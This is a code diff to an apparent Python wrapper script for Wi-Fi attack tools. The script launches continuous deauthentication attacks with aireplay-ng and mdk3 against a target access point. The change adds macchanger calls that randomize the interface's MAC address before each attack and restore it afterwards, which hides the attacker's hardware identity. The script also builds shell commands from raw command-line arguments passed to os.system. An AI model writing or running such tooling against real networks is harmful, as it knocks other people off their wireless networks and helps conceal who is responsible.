@@ -50,15 +50,20 @@ def start():
       if(sys.argv[2] == "--a"):
          mode="aireplay-ng "
          print("############################# Quiet: "+mode+" attack #############################")
-         os.system("airodump-ng "+str(sys.argv[4])+"")
+         print("Changing the MAC")
+         os.system("macchanger -r "+str(sys.argv[4])+"")
          #os.system("airmon-ng start "+str(sys.argv[5])+" "+str(sys.argv[8])+"")
          os.system(""+mode+"-0 0 -a "+str(sys.argv[6])+" "+str(sys.argv[4])+"")
          #os.system("airmon-ng stop "+str(sys.argv[5])+"mon")
+         os.system("macchanger -p "+str(sys.argv[4])+"")
          
       if(sys.argv[2] == "--m"):
          mode="mdk3 "
          print("############################# Quiet: "+mode+" attack #############################")
+         print("Changing the MAC")
+         os.system("macchanger -r "+str(sys.argv[4])+"")
          os.system(""+mode+str(sys.argv[4])+" d -n"+str(sys.argv[6])+"")
+         os.system("macchanger -p "+str(sys.argv[4])+"")
       
       
 try:
@@ -79,7 +84,11 @@ except Exception:
    os.system('cat -n monitor.rmo')
    monitor = raw_input("Select you wirelles card fo monitor mode: ")
    os.system("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^//' | grep -n ^ | grep '"+monitor+"' | cut -d: -f2 > monitor.rmo")
+   print("Changing the MAC")
+   os.system("macchanger -r "+str(sys.argv[4])+"")
    print("")
    
+   
+   os.system("macchanger -p "+str(sys.argv[4])+"")
 else:
    start()
